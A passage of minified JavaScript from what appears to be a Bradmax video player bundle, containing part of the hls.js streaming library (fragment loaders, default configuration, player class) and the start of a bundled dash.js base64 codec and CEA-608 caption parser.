"+this.retryDelay+"..."),this.abortInternal(),this.loader=null,self.clearTimeout(this.retryTimeout),this.retryTimeout=self.setTimeout(this.loadInternal.bind(this),this.retryDelay),this.retryDelay=Math.min(2*this.retryDelay,K.maxRetryDelay),e.retry++);else self.clearTimeout(this.requestTimeout),this.requestTimeout=self.setTimeout(this.loadtimeout.bind(this),K.timeout)}},ca.loadtimeout=function(){Fa.b.warn("timeout while loading "+this.context.url);var n=this.callbacks;n&&(this.abortInternal(),n.onTimeout(this.stats,this.context,this.loader))},ca.loadprogress=function(n){var k=this.stats;k.loaded=n.loaded,n.lengthComputable&&(k.total=n.total)},ca.getCacheAge=function(){var n=null;return this.loader&&oe.test(this.loader.getAllResponseHeaders())&&(n=(n=this.loader.getResponseHeader("age"))?parseFloat(n):null),n},ta}(),Ma=function(){function ta(n){this.context=this.controller=this.response=this.request=this.requestTimeout=this.fetchSetup=void 0,this.callbacks=this.config=null,this.stats=void 0,this.loader=null,this.fetchSetup=n.fetchSetup||ib,this.controller=new self.AbortController,this.stats=new $d.a}var ca=ta.prototype;return ca.destroy=function(){this.loader=this.callbacks=null,this.abortInternal()},ca.abortInternal=function(){this.stats.aborted=!0,this.controller.abort()},ca.abort=function(){var n;this.abortInternal(),null!==(n=this.callbacks)&&void 0!==n&&n.onAbort&&this.callbacks.onAbort(this.stats,this.context,this.response)},ca.load=function(n,k,e){var y=this,K=this.stats;if(K.loading.start)throw Error("Loader can only be used once.");K.loading.start=self.performance.now();var Ha,Ua,ea=(Ha=n,Ua={method:"GET",mode:"cors",credentials:"same-origin",signal:Ua=this.controller.signal},Ha.rangeEnd&&(Ua.headers=new self.Headers({Range:"bytes="+Ha.rangeStart+"-"+String(Ha.rangeEnd-1)})),Ua),sa=e.onProgress,ya="arraybuffer"===n.responseType,Ea=ya?"byteLength":"length";this.context=n,this.config=k,this.callbacks=e,this.request=this.fetchSetup(n,ea),self.clearTimeout(this.requestTimeout),this.requestTimeout=self.setTimeout((function(){y.abortInternal(),e.onTimeout(K,n,y.response)}),k.timeout),self.fetch(this.request).then((function(Ha){if(y.response=y.loader=Ha,!Ha.ok)throw new fc(Ha.statusText||"fetch, bad network response",Ha.status,Ha);return K.loading.first=Math.max(self.performance.now(),K.loading.start),K.total=parseInt(Ha.headers.get("Content-Length")||"0"),sa&&Object($a.a)(k.highWaterMark)?y.loadProgressively(Ha,K,n,k.highWaterMark,sa):ya?Ha.arrayBuffer():Ha.text()})).then((function(Ha){var Ua=y.response;self.clearTimeout(y.requestTimeout),K.loading.end=Math.max(self.performance.now(),K.loading.first),K.loaded=K.total=Ha[Ea];var kb={url:Ua.url,data:Ha};sa&&!Object($a.a)(k.highWaterMark)&&sa(K,n,Ha,Ua),e.onSuccess(kb,K,n,Ua)})).catch((function(Ha){self.clearTimeout(y.requestTimeout),K.aborted||e.onError({code:Ha.code||0,text:Ha.message},n,Ha.details)}))},ca.getCacheAge=function(){var n=null;return this.response&&(n=(n=this.response.headers.get("age"))?parseFloat(n):null),n},ca.loadProgressively=function(n,k,e,y,K){void 0===y&&(y=0);var ea=new wd.a,sa=n.body.getReader();return function Ea(){return sa.read().then((function(Ha){if(Ha.done)return ea.dataLength&&K(k,e,ea.flush(),n),Promise.resolve(new ArrayBuffer(0));var Ua=(Ha=Ha.value).length;return k.loaded+=Ua,Ua<y||ea.dataLength?(ea.push(Ha),ea.dataLength>=y&&K(k,e,ea.flush(),n)):K(k,e,Ha,n),Ea()})).catch((function(){return Promise.reject()}))}()},ta}(),fc=function(ta){function ca(n,k,e){var y;return(y=ta.call(this,n)||this).code=void 0,y.details=void 0,y.code=k,y.details=e,y}return ca.prototype=Object.create(ta.prototype),ca.prototype.constructor=ca,Ta(ca,ta),ca}(Da(Error)),pe=/\s/,ae=Ab(Ab({autoStartLoad:!0,startPosition:-1,defaultAudioCodec:void 0,debug:!1,capLevelOnFPSDrop:!1,capLevelToPlayerSize:!1,initialLiveManifestSize:1,maxBufferLength:30,backBufferLength:1/0,maxBufferSize:6e7,maxBufferHole:.1,highBufferWatchdogPeriod:2,nudgeOffset:.1,nudgeMaxRetry:3,maxFragLookUpTolerance:.25,liveSyncDurationCount:3,liveMaxLatencyDurationCount:1/0,liveSyncDuration:void 0,liveMaxLatencyDuration:void 0,maxLiveSyncPlaybackRate:1,liveDurationInfinity:!1,liveBackBufferLength:null,maxMaxBufferLength:600,enableWorker:!0,enableSoftwareAES:!0,manifestLoadingTimeOut:1e4,manifestLoadingMaxRetry:1,manifestLoadingRetryDelay:1e3,manifestLoadingMaxRetryTimeout:64e3,startLevel:void 0,levelLoadingTimeOut:1e4,levelLoadingMaxRetry:4,levelLoadingRetryDelay:1e3,levelLoadingMaxRetryTimeout:64e3,fragLoadingTimeOut:2e4,fragLoadingMaxRetry:6,fragLoadingRetryDelay:1e3,fragLoadingMaxRetryTimeout:64e3,startFragPrefetch:!1,fpsDroppedMonitoringPeriod:5e3,fpsDroppedMonitoringThreshold:.2,appendErrorMaxRetry:3,loader:pd,fLoader:void 0,pLoader:void 0,xhrSetup:void 0,licenseXhrSetup:void 0,licenseResponseCallback:void 0,abrController:ed,bufferController:xd,capLevelController:Yd,fpsController:ve,stretchShortVideoTrack:!1,maxAudioFramesDrift:1,forceKeyFrameOnDiscontinuity:!0,abrEwmaFastLive:3,abrEwmaSlowLive:9,abrEwmaFastVoD:3,abrEwmaSlowVoD:9,abrEwmaDefaultEstimate:5e5,abrBandWidthFactor:.95,abrBandWidthUpFactor:.7,abrMaxWithRealBitrate:!1,maxStarvationDelay:4,maxLoadingDelay:4,minAutoBitrate:0,emeEnabled:!1,widevineLicenseUrl:void 0,drmSystemOptions:{},requestMediaKeySystemAccessFunc:Zd,testBandwidth:!0,progressive:!1,lowLatencyMode:!0},{cueHandler:{newCue:function(ta,ca,n,k){for(var e,y,K,ea,sa,ya=[],Ea=self.VTTCue||self.TextTrackCue,Ha=0;Ha<k.rows.length;Ha++)if(K=!0,ea=0,sa="",!(e=k.rows[Ha]).isEmpty()){for(var Ua=0;Ua<e.chars.length;Ua++)pe.test(e.chars[Ua].uchar)&&K?ea++:(sa+=e.chars[Ua].uchar,K=!1);e.cueStartTime=ca,ca===n&&(n+=1e-4),16<=ea?ea--:ea++,K=xa(ca,n,e=sa.trim().replace(/<br(?: \/)?>/gi,"\n")),ta&&ta.cues&&ta.cues.getCueById(K)||((y=new Ea(ca,n,e)).id=K,y.line=Ha+1,y.align="left",y.position=10+Math.min(80,10*Math.floor(8*ea/32)),ya.push(y))}return ta&&ya.length&&(ya.sort((function(kb,cb){return"auto"===kb.line||"auto"===cb.line?0:8<kb.line&&8<cb.line?cb.line-kb.line:kb.line-cb.line})),ya.forEach((function(kb){return p(ta,kb)}))),ya}},enableCEA708Captions:!0,enableWebVTT:!0,enableIMSC1:!0,captionsTextTrack1Label:"English",captionsTextTrack1LanguageCode:"en",captionsTextTrack2Label:"Spanish",captionsTextTrack2LanguageCode:"es",captionsTextTrack3Label:"Unknown CC",captionsTextTrack3LanguageCode:"",captionsTextTrack4Label:"Unknown CC",captionsTextTrack4LanguageCode:"",renderTextTracksNatively:!0}),{},{subtitleStreamController:Qd,subtitleTrackController:ke,timelineController:ne,audioStreamController:ie,audioTrackController:je,emeController:Cd}),rc=function(){function ta(e){if(void 0===e&&(e={}),this.networkControllers=this.coreComponents=this.userConfig=this.config=void 0,this._emitter=new Zc.EventEmitter,this.emeController=this.subtitleTrackController=this.audioTrackController=this.streamController=this.levelController=this.latencyController=this.capLevelController=this.bufferController=this.abrController=this._autoLevelCapping=void 0,this.url=this._media=null,(e.liveSyncDurationCount||e.liveMaxLatencyDurationCount)&&(e.liveSyncDuration||e.liveMaxLatencyDuration))throw Error("Illegal hls.js config: don't mix up liveSyncDurationCount/liveMaxLatencyDurationCount and liveSyncDuration/liveMaxLatencyDuration");if(void 0!==e.liveMaxLatencyDurationCount&&(void 0===e.liveSyncDurationCount||e.liveMaxLatencyDurationCount<=e.liveSyncDurationCount))throw Error('Illegal hls.js config: "liveMaxLatencyDurationCount" must be greater than "liveSyncDurationCount"');if(void 0!==e.liveMaxLatencyDuration&&(void 0===e.liveSyncDuration||e.liveMaxLatencyDuration<=e.liveSyncDuration))throw Error('Illegal hls.js config: "liveMaxLatencyDuration" must be greater than "liveSyncDuration"');var y=this.config=mb({},ta.DefaultConfig,e);if(this.userConfig=e,Object(Fa.a)(y.debug),this._autoLevelCapping=-1,y.progressive)if((e=y.loader)!==Ma&&e!==pd)Fa.b.log("[config]: Custom loader detected, cannot enable progressive streaming"),y.progressive=!1;else{a:{if(self.fetch&&self.AbortController&&self.ReadableStream&&self.Request)try{var K=(new self.ReadableStream({}),!0);break a}catch(ub){}K=!1}K&&(y.loader=Ma,y.progressive=!0,y.enableSoftwareAES=!0,Fa.b.log("[config]: Progressive streaming enabled, using FetchLoader"))}e=y.bufferController;var ea=y.capLevelController,sa=y.fpsController;K=this.abrController=new y.abrController(this),e=this.bufferController=new e(this),ea=this.capLevelController=new ea(this);var ya=new sa(this),Ea=new Sb(this),Ha=new ac(this),Ua=new xc(this),kb=this.levelController=new Hb(this);sa=new wc(this);var cb=this.streamController=new yc(this,sa);ea.setStreamController(cb),ya.setStreamController(cb),this.networkControllers=kb=[kb,cb],K=[Ea,Ha,K,e,ea,ya,Ua,sa],this.audioTrackController=this.createController(y.audioTrackController,null,kb),this.createController(y.audioStreamController,sa,kb),this.subtitleTrackController=this.createController(y.subtitleTrackController,null,kb),this.createController(y.subtitleStreamController,sa,kb),this.createController(y.timelineController,null,K),this.emeController=this.createController(y.emeController,null,K),this.latencyController=this.createController(cc,null,K),this.coreComponents=K}ta.isSupported=function(){var e=self.MediaSource||self.WebKitMediaSource;if(e){var y=self.SourceBuffer||self.WebKitSourceBuffer;e=e&&"function"==typeof e.isTypeSupported&&e.isTypeSupported('video/mp4; codecs="avc1.42E01E,mp4a.40.2"'),y=!y||y.prototype&&"function"==typeof y.prototype.appendBuffer&&"function"==typeof y.prototype.remove,y=!!e&&!!y}else y=!1;return y};var ca,n,k=ta.prototype;return k.createController=function(e,y,K){return e?(e=y?new e(this,y):new e(this),K&&K.push(e),e):null},k.on=function(e,y,K){void 0===K&&(K=this),this._emitter.on(e,y,K)},k.once=function(e,y,K){void 0===K&&(K=this),this._emitter.once(e,y,K)},k.removeAllListeners=function(e){this._emitter.removeAllListeners(e)},k.off=function(e,y,K,ea){void 0===K&&(K=this),this._emitter.off(e,y,K,ea)},k.listeners=function(e){return this._emitter.listeners(e)},k.emit=function(e,y,K){return this._emitter.emit(e,y,K)},k.trigger=function(e,y){if(this.config.debug)return this.emit(e,e,y);try{return this.emit(e,e,y)}catch(K){Fa.b.error("An internal error happened while handling event "+e+'. Error message: "'+K.message+'". Here is a stacktrace:',K),this.trigger(ua.a.ERROR,{type:Ka.b.OTHER_ERROR,details:Ka.a.INTERNAL_EXCEPTION,fatal:!1,event:e,error:K})}return!1},k.listenerCount=function(e){return this._emitter.listenerCount(e)},k.destroy=function(){Fa.b.log("destroy"),this.trigger(ua.a.DESTROYING,void 0),this.detachMedia(),this.removeAllListeners(),this._autoLevelCapping=-1,this.url=null,this.networkControllers.forEach((function(e){return e.destroy()})),this.networkControllers.length=0,this.coreComponents.forEach((function(e){return e.destroy()})),this.coreComponents.length=0},k.attachMedia=function(e){Fa.b.log("attachMedia"),this._media=e,this.trigger(ua.a.MEDIA_ATTACHING,{media:e})},k.detachMedia=function(){Fa.b.log("detachMedia"),this.trigger(ua.a.MEDIA_DETACHING,void 0),this._media=null},k.loadSource=function(e){this.stopLoad();var y=this.media,K=this.url,ea=this.url=Za.buildAbsoluteURL(self.location.href,e,{alwaysNormalize:!0});Fa.b.log("loadSource:"+ea),y&&K&&K!==ea&&this.bufferController.hasSourceTypes()&&(this.detachMedia(),this.attachMedia(y)),this.trigger(ua.a.MANIFEST_LOADING,{url:e})},k.startLoad=function(e){void 0===e&&(e=-1),Fa.b.log("startLoad("+e+")"),this.networkControllers.forEach((function(y){y.startLoad(e)}))},k.stopLoad=function(){Fa.b.log("stopLoad"),this.networkControllers.forEach((function(e){e.stopLoad()}))},k.swapAudioCodec=function(){Fa.b.log("swapAudioCodec"),this.streamController.swapAudioCodec()},k.recoverMediaError=function(){Fa.b.log("recoverMediaError");var e=this._media;this.detachMedia(),e&&this.attachMedia(e)},k.removeLevel=function(e,y){void 0===y&&(y=0),this.levelController.removeLevel(e,y)},n=[{key:"version",get:function(){return"1.0.1"}},{key:"Events",get:function(){return ua.a}},{key:"ErrorTypes",get:function(){return Ka.b}},{key:"ErrorDetails",get:function(){return Ka.a}},{key:"DefaultConfig",get:function(){return ta.defaultConfig?ta.defaultConfig:ae},set:function(e){ta.defaultConfig=e}}],ca=[{key:"levels",get:function(){return this.levelController.levels||[]}},{key:"currentLevel",get:function(){return this.streamController.currentLevel},set:function(e){Fa.b.log("set currentLevel:"+e),this.loadLevel=e,this.abrController.clearTimer(),this.streamController.immediateLevelSwitch()}},{key:"nextLevel",get:function(){return this.streamController.nextLevel},set:function(e){Fa.b.log("set nextLevel:"+e),this.levelController.manualLevel=e,this.streamController.nextLevelSwitch()}},{key:"loadLevel",get:function(){return this.levelController.level},set:function(e){Fa.b.log("set loadLevel:"+e),this.levelController.manualLevel=e}},{key:"nextLoadLevel",get:function(){return this.levelController.nextLoadLevel},set:function(e){this.levelController.nextLoadLevel=e}},{key:"firstLevel",get:function(){return Math.max(this.levelController.firstLevel,this.minAutoLevel)},set:function(e){Fa.b.log("set firstLevel:"+e),this.levelController.firstLevel=e}},{key:"startLevel",get:function(){return this.levelController.startLevel},set:function(e){Fa.b.log("set startLevel:"+e),-1!==e&&(e=Math.max(e,this.minAutoLevel)),this.levelController.startLevel=e}},{key:"capLevelToPlayerSize",get:function(){return this.config.capLevelToPlayerSize},set:function(e){(e=!!e)!==this.config.capLevelToPlayerSize&&(e?this.capLevelController.startCapping():(this.capLevelController.stopCapping(),this.autoLevelCapping=-1,this.streamController.nextLevelSwitch()),this.config.capLevelToPlayerSize=e)}},{key:"autoLevelCapping",get:function(){return this._autoLevelCapping},set:function(e){this._autoLevelCapping!==e&&(Fa.b.log("set autoLevelCapping:"+e),this._autoLevelCapping=e)}},{key:"bandwidthEstimate",get:function(){var e=this.abrController.bwEstimator;return e?e.getEstimate():NaN}},{key:"autoLevelEnabled",get:function(){return-1===this.levelController.manualLevel}},{key:"manualLevel",get:function(){return this.levelController.manualLevel}},{key:"minAutoLevel",get:function(){var e=this.levels,y=this.config.minAutoBitrate;if(!e)return 0;for(var K=e.length,ea=0;ea<K;ea++)if(e[ea].maxBitrate>y)return ea;return 0}},{key:"maxAutoLevel",get:function(){var e=this.levels,y=this.autoLevelCapping;return-1===y&&e&&e.length?e.length-1:y}},{key:"nextAutoLevel",get:function(){return Math.min(Math.max(this.abrController.nextAutoLevel,this.minAutoLevel),this.maxAutoLevel)},set:function(e){this.abrController.nextAutoLevel=Math.max(this.minAutoLevel,e)}},{key:"audioTracks",get:function(){var e=this.audioTrackController;return e?e.audioTracks:[]}},{key:"audioTrack",get:function(){var e=this.audioTrackController;return e?e.audioTrack:-1},set:function(e){var y=this.audioTrackController;y&&(y.audioTrack=e)}},{key:"subtitleTracks",get:function(){var e=this.subtitleTrackController;return e?e.subtitleTracks:[]}},{key:"subtitleTrack",get:function(){var e=this.subtitleTrackController;return e?e.subtitleTrack:-1},set:function(e){var y=this.subtitleTrackController;y&&(y.subtitleTrack=e)}},{key:"media",get:function(){return this._media}},{key:"subtitleDisplay",get:function(){var e=this.subtitleTrackController;return!!e&&e.subtitleDisplay},set:function(e){var y=this.subtitleTrackController;y&&(y.subtitleDisplay=e)}},{key:"lowLatencyMode",get:function(){return this.config.lowLatencyMode},set:function(e){this.config.lowLatencyMode=e}},{key:"liveSyncPosition",get:function(){return this.latencyController.liveSyncPosition}},{key:"latency",get:function(){return this.latencyController.latency}},{key:"maxLatency",get:function(){return this.latencyController.maxLatency}},{key:"targetLatency",get:function(){return this.latencyController.targetLatency}},{key:"drift",get:function(){return this.latencyController.drift}},{key:"forceStartLoad",get:function(){return this.streamController.forceStartLoad}}],db(ta.prototype,ca),n&&db(ta,n),ta}();rc.defaultConfig=void 0}]).default},"object"==typeof U&&"object"==typeof Ja?Ja.exports=Va():"function"==typeof define&&define.amd?define([],Va):"object"==typeof U?U.Hls=Va():wa.Hls=Va())}(window,xb,jb),xb.exports&&(pb.hls=xb.exports)}catch(sb){console.error(sb)}}if(window.bradmax||(window.bradmax={}),window.bradmax.jsdependency||(window.bradmax.jsdependency={}),!window.bradmax.jsdependency.js_ae322d44547c32073185463ba706378c){window.bradmax.jsdependency.js_ae322d44547c32073185463ba706378c=!0;try{xb={},sb=window,Va=(wa=sb).dashjs,Na={skipAutoCreate:!0},wa.dashjs=Na,function v(u,da,M){function m(f,g){if(!da[f]){if(!u[f]){var t="function"==typeof require&&require;if(!g&&t)return t(f,!0);if(p)return p(f,!0);throw(g=Error("Cannot find module '"+f+"'")).code="MODULE_NOT_FOUND",g}g=da[f]={exports:{}},u[f][0].call(g.exports,(function(r){return m(u[f][1][r]||r)}),g,g.exports,v,u,da,M)}return da[f].exports}for(var p="function"==typeof require&&require,l=0;l<M.length;l++)m(M[l]);return m}({1:[function(u,da,M){function v(x){for(var z=0,J=[],E=0|x.length/3;0<E--;){var D=(x[z]<<16)+(x[z+1]<<8)+x[z+2];z+=3,J.push(l.charAt(63&D>>18)),J.push(l.charAt(63&D>>12)),J.push(l.charAt(63&D>>6)),J.push(l.charAt(63&D))}return 2==x.length-z?(D=(x[z]<<16)+(x[z+1]<<8),J.push(l.charAt(63&D>>18)),J.push(l.charAt(63&D>>12)),J.push(l.charAt(63&D>>6)),J.push("=")):1==x.length-z&&(D=x[z]<<16,J.push(l.charAt(63&D>>18)),J.push(l.charAt(63&D>>12)),J.push("==")),J.join("")}function m(x){for(var z=0,J=[],E=0|x.length/4;0<E--;){var D=(f[x.charCodeAt(z)]<<18)+(f[x.charCodeAt(z+1)]<<12)+(f[x.charCodeAt(z+2)]<<6)+f[x.charCodeAt(z+3)];J.push(255&D>>16),J.push(255&D>>8),J.push(255&D),z+=4}return J&&("="==x.charAt(z-2)?(J.pop(),J.pop()):"="==x.charAt(z-1)&&J.pop()),J}var p_encode=function(x){for(var z=[],J=0;J<x.length;++J){var E=x.charCodeAt(J);128>E?z.push(E):(2048>E?z.push(192|E>>6):(65536>E?z.push(224|E>>12):(z.push(240|E>>18),z.push(128|63&E>>12)),z.push(128|63&E>>6)),z.push(128|63&E))}return z},p_decode=function(x){for(var z=[],J=0;J<x.length;){var E=x[J++];128>E||(224>E?E=(31&E)<<6:(240>E?E=(15&E)<<12:(E=(7&E)<<18,E|=(63&x[J++])<<12),E|=(63&x[J++])<<6),E|=63&x[J++]),z.push(String.fromCharCode(E))}return z.join("")},l="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",f=function(){for(var x=[],z=0;z<l.length;++z)x[l.charCodeAt(z)]=z;return x[61]=0,x}(),g_encode=function(x){for(var z=[],J=0;J<x.length;++J)z.push(x.charCodeAt(J));return z};u=function(x){return x=m(x),new Uint8Array(x)},da=function(x){return v(x=g_encode(x))},void 0!==M&&(M.decode=function(x){return x=m(x),p_decode(x)},M.decodeArray=u,M.encode=function(x){return v(x=p_encode(x))},M.encodeASCII=da)},{}],2:[function(u,da,M){!function(v){function m(N){var w=N;return z.hasOwnProperty(N)&&(w=z[N]),String.fromCharCode(w)}function p(N){for(var w=[],h=0;h<N.length;h++)w.push(N[h].toString(16));return w}function l(N,w,h,F,P){this.foreground=N||"white",this.underline=w||!1,this.italics=h||!1,this.background=F||"black",this.flash=P||!1}function f(N,w,h,F,P,O){this.uchar=N||" ",this.penState=new l(w,h,F,P,O)}function g(){this.chars=[];for(var N=0;32>N;N++)this.chars.push(new f);this.pos=0,this.currPenState=new l}function t(){this.rows=[];for(var N=0;15>N;N++)this.rows.push(new g);this.currRow=14,this.nrRollUpRows=null,this.reset()}function r(N,w){this.chNr=N,this.outputFilter=w,this.mode=null,this.verbose=0,this.displayedMemory=new t,this.nonDisplayedMemory=new t,this.lastOutputScreen=new t,this.currRollUpRow=this.displayedMemory.rows[14],this.writeScreen=this.displayedMemory,this.cueStartTime=this.mode=null}function x(N,w,h){this.field=N||1,this.outputs=[w,h],this.channels=[new r(1,w),new r(2,h)],this.currChNr=-1,this.lastCmdB=this.lastCmdA=null,this.bufferedData=[],this.lastTime=this.startTime=null,this.dataCounters={padding:0,char:0,cmd:0,other:0}}var z={42:225,92:233,94:237,95:243,96:250,123:231,124:247,125:209,126:241,127:9608,128:174,129:176,130:189,131:191,132:8482,133:162,134:163,135:9834,136:224,137:32,138:232,139:226,140:234,141:238,142:244,143:251,144:193,145:201,146:211,147:218,148:220,149:252,150:8216,151:161,152:42,153:8217,154:9473,155:169,156:8480,157:8226,158:8220,159:8221,160:192,161:194,162:199,163:200,164:202,165:203,166:235,167:206,168:207,169:239,170:212,171:217,172:249,173:219,174:171,175:187,176:195,177:227,178:205,179:204,180:236,181:210,182:242,183:213,184:245,185:123,186:125,187:92,188:94,189:95,190:124,191:8764,192:196,193:228,194:214,195:246,196:223,197:165,198:164,199:9475,200:197,201:229,202:216,203:248,204:9487,205:9491,206:9495,207:9499},J={17:1,18:3,21:5,22:7,23:9,16:11,19:12,20:14},E={17:2,18:4,21:6,22:8,23:10,19:13,20:15},D={25:1,26:3,29:5,30:7,31:9,24:11,27:12,28:14},I={25:2,26:4,29:6,30:8,31:10,27:13,28:15},L="white green blue cyan red yellow magenta black transparent".split(" "),G={verboseFilter:{DATA:3,DEBUG:3,INFO:2,WARNING:2,TEXT:1,ERROR:0},time:null,verboseLevel:0,setTime:function(N){this.time=N},log:function(N,w){this.verboseLevel>=this.verboseFilter[N]&&console.log(this.time+" ["+N+"] "+w)}};l.prototype={reset:function(){this.foreground="white",this.italics=this.underline=!1,this.background="black",this.flash=!1},setStyles:function(N){for(var w=["foreground","underline","italics","background","flash"],h=0;h<w.length;h++){var F=w[h];N.hasOwnProperty(F)&&(this[F]=N[F])}},isDefault:function(){return"white"===this.foreground&&!this.underline&&!this.italics&&"black"===this.background&&!this.flash},equals:function(N){return this.foreground===N.foreground&&this.underline===N.underline&&this.italics===N.italics&&this.background===N.background&&this.flash===N.flash},copy:function(N){this.foreground=N.foreground,this.underline=N.underline,this.italics=N.italics,this.background=N.background,this.flash=N.flash},toString:function(){return"color="+this.foreground+", underline="+this.underline+", italics="+this.italics+", background="+this.background+", flash="+this.flash}},f.prototype={reset:function(){this.uchar=" ",this.penState.reset()},setChar:function(N,w){this.uchar=N,this.penState.copy(w)},setPenState:function(N){this.penState.copy(N)},equals:function(N){return this.uchar===N.uchar&&this.penState.equals(N.penState)},copy:function(N){this.uchar=N.uchar,this.penState.copy(N.penState)},isEmpty:function(){return" "===this.uchar&&this.penState.isDefault()}},g.prototype={equals:function(N){for(var w=!0,h=0;32>h;h++)if(!this.chars[h].equals(N.chars[h])){w=!1;break}return w},copy:function(N){for(var w=0;32>w;w++)this.chars[w].copy(N.chars[w])},isEmpty:function(){for(var N=!0,w=0;32>w;w++)if(!this.chars[w].isEmpty()){N=!1;break}return N},setCursor:function(N){this.pos!==N&&(this.pos=N),0>this.pos?(G.log("ERROR","Negative cursor position "+this.pos),this.pos=0):32<this.pos&&(G.log("ERROR","Too large cursor position "+this.pos),this.pos=32)},moveCursor:function(N){var w=this.pos+N;if(1<N)for(N=this.pos+1;N<w+1;N++)this.chars[N].setPenState(this.currPenState);this.setCursor(w)},backSpace:function(){this.moveCursor(-1),this.chars[this.pos].setChar(" ",this.currPenState)},insertChar:function(N){144<=N&&this.backSpace();var w=m(N);32<=this.pos?G.log("ERROR","Cannot insert "+N.toString(16)+" ("+w+") at position "+this.pos+". Skipping it!"):(this.chars[this.pos].setChar(w,this.currPenState),this.moveCursor(1))},clearFromPos:function(N){for(;32>N;N++)this.chars[N].reset()},clear:function(){this.clearFromPos(0),this.pos=0,this.currPenState.reset()},clearToEndOfRow:function(){this.clearFromPos(this.pos)},getTextString:function(){for(var N=[],w=!0,h=0;32>h;h++){var F=this.chars[h].uchar;" "!==F&&(w=!1),N.push(F)}return w?"":N.join("")},setPenStyles:function(N){this.currPenState.setStyles(N),this.chars[this.pos].setPenState(this.currPenState)}},t.prototype={reset:function(){for(var N=0;15>N;N++)this.rows[N].clear();this.currRow=14},equals:function(N){for(var w=!0,h=0;15>h;h++)if(!this.rows[h].equals(N.rows[h])){w=!1;break}return w},copy:function(N){for(var w=0;15>w;w++)this.rows[w].copy(N.rows[w])},isEmpty:function(){for(var N=!0,w=0;15>w;w++)if(!this.rows[w].isEmpty()){N=!1;break}return N},backSpace:function(){this.rows[this.currRow].backSpace()},clearToEndOfRow:function(){this.rows[this.currRow].clearToEndOfRow()},insertChar:function(N){this.rows[this.currRow].insertChar(N)},setPen:function(N){this.rows[this.currRow].setPenStyles(N)},moveCursor:function(N){this.rows[this.currRow].moveCursor(N)},setCursor:function(N){G.log("INFO","setCursor: "+N),this.rows[this.currRow].setCursor(N)},setPAC:function(N){G.log("INFO","pacData = "+JSON.stringify(N));var h,F,w=N.row-1;this.nrRollUpRows&&w<this.nrRollUpRows-1&&(w=this.nrRollUpRows-1),this.currRow=w,w=this.rows[this.currRow],null!==N.indent&&(h=N.indent,F=Math.max(h-1,0),w.setCursor(N.indent),N.color=w.chars[F].penState.foreground),this.setPen({foreground:N.color,underline:N.underline,italics:N.italics,background:"black",flash:!1})},setBkgData:function(N){G.log("INFO","bkgData = "+JSON.stringify(N)),this.backSpace(),this.setPen(N),this.insertChar(32)},setRollUpRows:function(N){this.nrRollUpRows=N},rollUp:function(){var N,w;null!==this.nrRollUpRows?(G.log("TEXT",this.getDisplayText()),N=this.currRow+1-this.nrRollUpRows,(w=this.rows.splice(N,1)[0]).clear(),this.rows.splice(this.currRow,0,w),G.log("INFO","Rolling up")):G.log("DEBUG","roll_up but nrRollUpRows not set yet")},getDisplayText:function(N){N=N||!1;for(var w=[],h="",F=-1,P=0;15>P;P++){var O=this.rows[P].getTextString();O&&(F=P+1,N?w.push("Row "+F+': "'+O+'"'):w.push(O.trim()))}return 0<w.length&&(h=N?"["+w.join(" | ")+"]":w.join("\n")),h},getTextAndFormat:function(){return this.rows}},r.prototype={modes:["MODE_ROLL-UP","MODE_POP-ON","MODE_PAINT-ON","MODE_TEXT"],reset:function(){this.mode=null,this.displayedMemory.reset(),this.nonDisplayedMemory.reset(),this.lastOutputScreen.reset(),this.currRollUpRow=this.displayedMemory.rows[14],this.writeScreen=this.displayedMemory,this.lastCueEndTime=this.cueStartTime=this.mode=null},getHandler:function(){return this.outputFilter},setHandler:function(N){this.outputFilter=N},setPAC:function(N){this.writeScreen.setPAC(N)},setBkgData:function(N){this.writeScreen.setBkgData(N)},setMode:function(N){N!==this.mode&&(this.mode=N,G.log("INFO","MODE="+N),"MODE_POP-ON"==this.mode?this.writeScreen=this.nonDisplayedMemory:(this.writeScreen=this.displayedMemory,this.writeScreen.reset()),"MODE_ROLL-UP"!==this.mode&&(this.displayedMemory.nrRollUpRows=null,this.nonDisplayedMemory.nrRollUpRows=null),this.mode=N)},insertChars:function(N){for(var w=0;w<N.length;w++)this.writeScreen.insertChar(N[w]);G.log("INFO",(this.writeScreen===this.displayedMemory?"DISP":"NON_DISP")+": "+this.writeScreen.getDisplayText(!0)),"MODE_PAINT-ON"!==this.mode&&"MODE_ROLL-UP"!==this.mode||(G.log("TEXT","DISPLAYED: "+this.displayedMemory.getDisplayText(!0)),this.outputDataUpdate())},cc_RCL:function(){G.log("INFO","RCL - Resume Caption Loading"),this.setMode("MODE_POP-ON")},cc_BS:function(){G.log("INFO","BS - BackSpace"),"MODE_TEXT"!==this.mode&&(this.writeScreen.backSpace(),this.writeScreen===this.displayedMemory&&this.outputDataUpdate())},cc_AOF:function(){},cc_AON:function(){},cc_DER:function(){G.log("INFO","DER- Delete to End of Row"),this.writeScreen.clearToEndOfRow(),this.outputDataUpdate()},cc_RU:function(N){G.log("INFO","RU("+N+") - Roll Up"),this.writeScreen=this.displayedMemory,this.setMode("MODE_ROLL-UP"),this.writeScreen.setRollUpRows(N)},cc_FON:function(){G.log("INFO","FON - Flash On"),this.writeScreen.setPen({flash:!0})},cc_RDC:function(){G.log("INFO","RDC - Resume Direct Captioning"),this.setMode("MODE_PAINT-ON")},cc_TR:function(){G.log("INFO","TR"),this.setMode("MODE_TEXT")},cc_RTD:function(){G.log("INFO","RTD"),this.setMode("MODE_TEXT")},cc_EDM:function(){G.log("INFO","EDM - Erase Displayed Memory"),this.displayedMemory.reset(),this.outputDataUpdate()},cc_CR:function(){G.log("CR - Carriage Return"),this.writeScreen.rollUp(),this.outputDataUpdate()},cc_ENM:function(){G.log("INFO","ENM - Erase Non-displayed Memory"),this.nonDisplayedMemory.reset()},cc_EOC:function(){var N;G.log("INFO","EOC - End Of Caption"),"MODE_POP-ON"===this.mode&&(N=this.displayedMemory,this.displayedMemory=this.nonDisplayedMemory,this.nonDisplayedMemory=N,this.writeScreen=this.nonDisplayedMemory,G.log("TEXT","DISP: "+this.displayedMemory.getDisplayText())),this.outputDataUpdate()},cc_TO:function(N){G.log("INFO","TO("+N+") - Tab Offset"),this.writeScreen.moveCursor(N)},cc_MIDROW:function(N){var w,h={flash:!1};h.underline=1==N%2,h.italics=46<=N,h.italics?h.foreground="white":(w=Math.floor(N/2)-16,h.foreground="white green blue cyan red yellow magenta".split(" ")[w]),G.log("INFO","MIDROW: "+JSON.stringify(h)),this.writeScreen.setPen(h)},outputDataUpdate:function(){var 